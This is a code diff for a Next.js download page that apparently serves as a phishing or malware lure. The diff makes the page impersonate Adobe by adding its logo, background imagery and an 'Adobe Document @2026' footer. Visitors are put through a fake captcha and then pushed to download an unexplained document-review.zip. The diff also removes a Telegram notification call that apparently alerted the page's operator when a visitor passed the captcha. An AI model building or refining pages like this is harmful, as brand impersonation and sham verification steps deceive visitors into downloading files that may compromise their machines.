@@ -2,6 +2,7 @@
 "use client";
 
 import { useEffect, useRef, useState } from "react";
+import Image from "next/image";
 
 const DOWNLOAD_URL = "/document-review.zip";
 const DOWNLOAD_NAME = "document-review.zip";
@@ -86,12 +87,6 @@ function CaptchaScreen({ onContinue }: { onContinue: () => void }) {
 
     const timer = window.setTimeout(() => {
       setStatus("complete");
-
-      void fetch("/api/send-telegram", {
-        method: "POST",
-      }).catch(() => {
-        console.warn("Notification request failed.");
-      });
     }, 2000);
 
     return () => window.clearTimeout(timer);
@@ -202,8 +197,6 @@ function CaptchaScreen({ onContinue }: { onContinue: () => void }) {
 
 export default function Home() {
   const [captchaComplete, setCaptchaComplete] = useState(false);
-  const [downloadStarted, setDownloadStarted] = useState(false);
-  const [showInstructions, setShowInstructions] = useState(false);
 
   const titleRef = useRef<HTMLHeadingElement>(null);
 
@@ -213,35 +206,51 @@ export default function Home() {
     }
   }, [captchaComplete]);
 
-  useEffect(() => {
-    if (!downloadStarted) return;
-
-    const timer = window.setTimeout(() => {
-      setShowInstructions(true);
-    }, 4000);
-
-    return () => window.clearTimeout(timer);
-  }, [downloadStarted]);
-
   return (
-    <div className="flex h-screen h-[100dvh] flex-col overflow-hidden bg-[#F8F8F6] font-sans text-stone-900 selection:bg-stone-200">
-      <header className="shrink-0 border-b border-stone-200/80 bg-white">
+    <div className="relative isolate flex h-screen h-[100dvh] flex-col overflow-hidden bg-[#F8F8F6] font-sans text-stone-900 selection:bg-stone-200">
+      {/* Full-screen background shown after continuing */}
+      {captchaComplete && (
+        <div
+          aria-hidden="true"
+          className="pointer-events-none fixed inset-0 -z-10 overflow-hidden"
+        >
+          <Image
+            src="/adobe.png"
+            alt=""
+            fill
+            priority
+            sizes="100vw"
+            className="scale-110 object-cover opacity-[0.12] blur-2xl"
+          />
+
+          <div className="absolute inset-0 bg-white/75" />
+        </div>
+      )}
+
+      <header className="shrink-0 border-b border-stone-200/80 bg-white/20 backdrop-blur-sm">
         <div className="mx-auto flex h-16 w-full max-w-6xl items-center justify-between px-5 sm:px-8">
           <a
             href="/"
             aria-label="Document Space home"
             className="flex items-center gap-2.5 rounded focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-stone-600"
           >
-            <span className="grid h-8 w-8 place-items-center rounded-md bg-stone-900 text-white" />
+            <Image
+              src="/adobe.png"
+              alt="Adobe icon"
+              width={32}
+              height={32}
+              priority
+              className="h-8 w-8 object-contain"
+            />
 
             <span className="text-sm font-semibold tracking-tight">
-              Document Space
+              Adobe Document
             </span>
           </a>
         </div>
       </header>
 
-      <main className="flex min-h-0 flex-1 overflow-y-auto px-5 py-6">
+      <main className="relative flex min-h-0 flex-1 overflow-y-auto px-5 py-6">
         <div className="my-auto flex w-full justify-center">
           {!captchaComplete ? (
             <CaptchaScreen
@@ -250,24 +259,16 @@ export default function Home() {
           ) : (
             <section
               aria-labelledby="page-title"
-              className="w-full max-w-[400px]"
+              className="relative w-full max-w-[400px]"
             >
               <div className="mb-7 text-center">
                 <p className="mb-3 text-[10px] font-semibold uppercase tracking-[0.22em] text-stone-500">
                   Shared with you
                 </p>
 
-                <h1
-                  ref={titleRef}
-                  tabIndex={-1}
-                  id="page-title"
-                  className="text-2xl font-medium tracking-tight outline-none sm:text-[28px]"
-                >
-                  Your download is ready.
-                </h1>
               </div>
 
-              <div className="rounded-xl border border-stone-200 bg-white p-6 shadow-[0_8px_30px_-20px_rgba(0,0,0,0.18)] sm:p-7">
+              <div className="rounded-xl border border-stone-200/80 bg-white/40 p-6 shadow-[0_12px_40px_-24px_rgba(0,0,0,0.22)] backdrop-blur-md sm:p-7">
                 <div className="mb-5 flex items-center justify-between">
                   <span className="grid h-12 w-12 place-items-center rounded-lg border border-stone-200 bg-stone-50">
                     <DocumentIcon className="h-6 w-6 text-stone-600" />
@@ -283,49 +284,19 @@ export default function Home() {
                 <a
                   href={DOWNLOAD_URL}
                   download={DOWNLOAD_NAME}
-                  onClick={() => setDownloadStarted(true)}
                   className="flex w-full items-center justify-center gap-3 rounded-md bg-stone-900 px-4 py-3 text-sm font-medium text-white transition-colors hover:bg-stone-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-stone-600"
                 >
                   Download
                   <DownloadIcon />
                 </a>
-
-                {downloadStarted && (
-                  <p
-                    role="status"
-                    className="mt-4 text-sm text-stone-500"
-                  >
-                    Download requested. Check your browser&apos;s Downloads
-                    list.
-                  </p>
-                )}
-
-                {showInstructions && (
-                  <div
-                    role="status"
-                    aria-live="polite"
-                    className="mt-5 rounded-lg border border-stone-200 bg-stone-50 p-4"
-                  >
-                    <h3 className="text-sm font-medium text-stone-900">
-                      Next steps
-                    </h3>
-
-                    <p className="mt-2 text-sm leading-6 text-stone-600">
-                      Open your browser&apos;s Downloads list and locate{" "}
-                      <strong>{DOWNLOAD_NAME}</strong>. If it is a ZIP archive,
-                      extract it first. Check the contents and open files.
-                      
-                    </p>
-                  </div>
-                )}
               </div>
             </section>
           )}
         </div>
       </main>
 
-      <footer className="shrink-0 border-t border-stone-200/70 px-5 py-4 text-center text-[10px] text-stone-400">
-        Document Space · Simple, considered sharing.
+      <footer className="shrink-0 border-t border-stone-200/70 bg-white/60 px-5 py-4 text-center text-[10px] text-stone-400 backdrop-blur-md">
+        Adobe Document @2026
       </footer>
     </div>
   );
